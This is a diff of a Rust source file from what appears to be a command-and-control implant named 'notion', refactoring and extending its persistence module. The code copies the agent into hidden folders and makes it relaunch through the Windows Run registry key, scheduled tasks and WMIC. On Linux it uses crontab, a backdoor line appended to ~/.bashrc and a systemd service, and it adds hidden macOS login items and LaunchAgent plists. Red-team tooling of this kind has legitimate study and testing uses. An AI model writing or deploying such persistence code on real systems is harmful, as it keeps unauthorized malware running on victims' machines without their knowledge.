@@ -1,7 +1,7 @@
 use std::error::Error;
 use std::env::{var, args};
 use is_root::is_root;
-use crate::cmd::{shell, save};
+use crate::cmd::{CommandArgs, shell, save, notion_out};
 #[cfg(not(windows))] use std::fs::{create_dir, copy, write};
 #[cfg(windows)] use std::path::Path;
 #[cfg(windows)] use winreg::{RegKey};
@@ -10,7 +10,7 @@ use crate::cmd::{shell, save};
 #[cfg(windows)] use std::process::Command;
 #[cfg(windows)] use crate::cmd::getprivs::is_elevated;
 use crate::config::ConfigOptions;
-use crate::logger::Logger;
+use crate::logger::{Logger, log_out};
 
 
 /// Uses the specified method to establish persistence. 
@@ -26,10 +26,10 @@ use crate::logger::Logger;
 /// 
 /// * `cron`: Writes a cronjob to the user's crontab and saves the agent in the home folder
 /// * `systemd`: Creates a systemd service and writes the binary someplace special
-pub async fn handle(s: &String, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
+pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
     // `persist [method] [args]`
     #[cfg(windows)] {
-        match s.trim() {
+        match cmd_args.nth(0).unwrap().as_str() {
             "startup" => {
                 // Get user
                 if let Ok(v) = var("APPDATA") {
@@ -42,7 +42,7 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions, logger: &Log
                         Err(e) => { return Ok(e.to_string())}
                     }
                 } else {
-                    return Ok("Couldn't get APPDATA location".to_string());
+                    return notion_out!("Couldn't get APPDATA location");
                 };
             },
             "registry" => {
@@ -50,20 +50,20 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions, logger: &Log
                     let mut persist_path: String = v;
                     persist_path.push_str(r"\notion.exe");
                     let exe_path = args().nth(0).unwrap();
-                    logger.debug(format!("Current exec path: {exe_path}"));
+                    logger.debug(log_out!("Current exec path: {exe_path}"));
                     // let mut out_file = File::create(path).expect("Failed to create file");
                     fs_copy(&exe_path, &persist_path)?;
                     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                     let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
                     let (key, disp) = hkcu.create_subkey(&path)?;
                     match disp {
-                        REG_CREATED_NEW_KEY => logger.info("A new key has been created".to_string()),
-                        REG_OPENED_EXISTING_KEY => logger.info("An existing key has been opened".to_string()),
+                        REG_CREATED_NEW_KEY => logger.info(log_out!("A new key has been created")),
+                        REG_OPENED_EXISTING_KEY => logger.info(log_out!("An existing key has been opened")),
                     };
                     key.set_value("Notion", &persist_path)?;
-                    Ok("Persistence accomplished".to_string())
+                    notion_out!("Persistence accomplished")
                 } else {
-                    Ok("LOCALDATA undefined".to_string())
+                    notion_out!("LOCALDATA undefined")
                 }
             },
             "wmic" => {
@@ -112,11 +112,11 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions, logger: &Log
                         }
                 
                     } else {
-                        return Ok("Could not locate APPDATA.".to_string());
+                        return notion_out!("Could not locate APPDATA.");
                     }
                 }
                 else{
-                    return Ok("[-] WMIC persistence requires admin privileges.".to_string());
+                    return notion_out!("[-] WMIC persistence requires admin privileges.");
                 }
             },
             "schtasks" => {
@@ -127,7 +127,8 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions, logger: &Log
                 if elevated {
                     if let Ok(v) = var("LOCALAPPDATA") {
                         let cfg_path = format!("{v}\\cfg.json");
-                        save::handle(&cfg_path, config_options).await?;
+                        let mut cfg_path_args = CommandArgs::from_string(cfg_path.to_owned());
+                        save::handle(&mut cfg_path_args, config_options).await?;
                         let mut persist_path: String = v;
                         persist_path.push_str(r"\notion.exe");
                         
@@ -162,71 +163,78 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions, logger: &Log
                         }
                 
                     } else {
-                        return Ok("Could not locate APPDATA.".to_string());
+                        return notion_out!("Could not locate APPDATA.");
                     }
                 }
                 else{
-                    return Ok("[-] Scheduled task persistence requires admin privileges.".to_string());
+                    return notion_out!("[-] Scheduled task persistence requires admin privileges.");
                 }
             },
 
 
 
-            _ => Ok("That's not a persistence method!".to_string())
+            _ => notion_out!("That's not a persistence method!")
         }
     }
 
-    #[cfg(not(windows))] {
+    #[cfg(target_os = "linux")] {
 
         let app_path = args().nth(0).unwrap();
         let home = var("HOME")?;
         let app_dir = format!("{home}/.notion");
         let dest_path = format!("{app_dir}/notion");
 
-        match s.trim() {
+        match cmd_args.nth(0).unwrap_or_default().as_str() {
             "cron"    => {
                 // Copy the app to a new folder
                 match create_dir(&app_dir) {
-                    Ok(_) => { logger.info("Notion directory created".to_string()); },
+                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
                     Err(e) => { logger.err(e.to_string()); }
                 };
                 if let Ok(_) = copy(&app_path, dest_path) {
                     // Save config for relaunch
-                    save::handle(&format!("{app_dir}/cfg.json"), config_options).await?;
+                    let mut save_args = CommandArgs::from_string(format!("{app_dir}/cfg.json"));
+                    save::handle(&mut save_args, config_options).await?;
                     // Write a cronjob to the user's crontab with the given minutes as an interval.
                     let cron_string = format!("0 * * * * {app_dir}/notion");
-                    if let Ok(_) = shell::handle(&format!("(crontab -l 2>/dev/null; echo '{cron_string}') | crontab - ")).await {
-                        Ok("Cronjob added!".to_string())
+                    let mut cron_args = CommandArgs::from_string(
+                        format!("(crontab -l 2>/dev/null; echo '{cron_string}') | crontab - ")
+                    );
+                    if let Ok(_) = shell::handle(&mut cron_args).await {
+                        notion_out!("Cronjob added!")
                     } else {
-                        Ok("Could not make cronjob".to_string())
+                        notion_out!("Could not make cronjob")
                     }
                 } else {
-                    Ok("Could not copy app to destination".to_string())
+                    notion_out!("Could not copy app to destination")
                 }
             }
             "bashrc"  => {
                 // Copy the app to a new folder
                 match create_dir(&app_dir) {
-                    Ok(_) => { logger.info("Notion directory created".to_string()); },
+                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
                     Err(e) => { logger.err(e.to_string()); }
                 };
                 if let Ok(_) = copy(&app_path, dest_path) {
                     // Save config for relaunch
                     let b64_config = config_options.to_base64();
                     // Write a line to the user's bashrc that starts the agent.
-                    if let Ok(_) = shell::handle(&format!("echo '{app_dir}/notion -b {b64_config} & disown' >> ~/.bashrc ")).await {
-                        Ok("Bash Backdoored!".to_string())
+                    let mut bashrc_args = CommandArgs::new(
+                        vec![format!("echo '{app_dir}/notion -b {b64_config} & disown' >> ~/.bashrc ")]
+                    );
+                    if let Ok(_) = shell::handle(&mut bashrc_args).await {
+                        notion_out!("Bash Backdoored!")
                     } else {
-                        Ok("Could not modify bashrc".to_string())
+                        notion_out!("Could not modify bashrc")
                     }
                 } else {
-                    Ok("Could not copy app to destination".to_string())
+                    notion_out!("Could not copy app to destination")
                 }
             },
             "service" => {
                 if is_root() {
                     match create_dir(&app_dir) {
-                        Ok(_) => { logger.info("Notion directory created".to_string()); },
+                        Ok(_) => { logger.info(format!("Notion directory created")); },
                         Err(e) => { logger.err(e.to_string()); }
                     };    
                     if let Ok(_) = copy(&app_path, &dest_path) {
@@ -249,15 +257,98 @@ ExecStart={dest_path} -b {b64_config}
 WantedBy=multi-user.target"
 );
                         write(svc_path, svc_string)?;
-                        return shell::handle(&"systemctl enable notion.service".to_string()).await;
+                        let mut systemd_args = CommandArgs::from_string(
+                            "systemctl enable notion.service".to_string()
+                        );
+                        return shell::handle(&mut systemd_args).await;
                     } else {
-                        return Ok("Could not copy service file".to_string());
+                        return notion_out!("Could not copy service file");
                     }
                 } else {
-                    return Ok("Need to be root first. Try elevate.".to_string());
+                    return notion_out!("Need to be root first. Try elevate.");
                 }
             }, 
-            _         => Ok("Unknown persistence method!".to_string())
+            _         => notion_out!("Unknown persistence method!")
         }
+    }
+
+    #[cfg(target_os = "macos")] {
+        let app_path = args().nth(0).unwrap();
+        let home = var("HOME")?;
+        let app_dir = format!("{home}/.notion");
+        let dest_path = format!("{app_dir}/notion");
+
+        match cmd_args.nth(0).unwrap_or_default().as_str() {
+            "loginitem" => {
+                // Copy the app to a new folder
+                match create_dir(&app_dir) {
+                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
+                    Err(e) => { logger.err(e.to_string()); }
+                };
+                if let Ok(_) = copy(&app_path, &dest_path) {
+                    // Save config for relaunch
+                    let b64_config = config_options.to_base64();
+                    // Write a line to the user's bashrc that starts the agent.
+                    let osascript_string = format!(r#"osascript -e 'tell application "System Events" to make login item at end with properties {{path:"{dest_path}", hidden:true}}'"#);
+                    logger.debug(osascript_string.to_owned());
+                    let mut applescript_args = CommandArgs::new(
+                        vec![osascript_string]
+                    );
+                    if let Ok(_) = shell::handle(&mut applescript_args).await {
+                        notion_out!("Login item created!")
+                    } else {
+                        notion_out!("Could not create login item")
+                    }
+                } else {
+                    notion_out!("Could not copy app to destination")
+                }
+
+            },
+            "launchagent" => {
+                
+                match create_dir(&app_dir) {
+                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
+                    Err(e) => { logger.err(e.to_string()); }
+                };    
+                if let Ok(_) = copy(&app_path, &dest_path) {
+                    let b64_config = config_options.to_base64();
+                    let launch_agent_dir: String;
+                    if is_root() {
+                        launch_agent_dir = "/Library/LaunchAgents".to_string();
+                    } else {
+                        launch_agent_dir = format!("{home}/Library/LaunchAgents");
+                    }
+                    let launch_agent_string = format!(
+r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>Label</key>
+<string>com.notion.offnote</string>
+<key>ProgramArguments</key>
+<array>
+<string>{dest_path}</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
+</dict>
+</plist>"#);
+                    // Make the user LaunchAgents dir if it doesn't exist
+                    
+                    if !std::path::Path::new(&launch_agent_dir).is_dir() {
+                        create_dir(&launch_agent_dir)?;
+                    }
+                    write(
+                        format!("{launch_agent_dir}/com.notion.offnote.plist").as_str(),
+                        &launch_agent_string
+                    )?;
+                    Ok(format!("LaunchAgent written to {launch_agent_dir}"))
+                } else {
+                    return notion_out!("Could not copy app to destination");
+                }
+            },
+            _ => notion_out!("Unknown persistence method!")
+        }
+
     }
 }
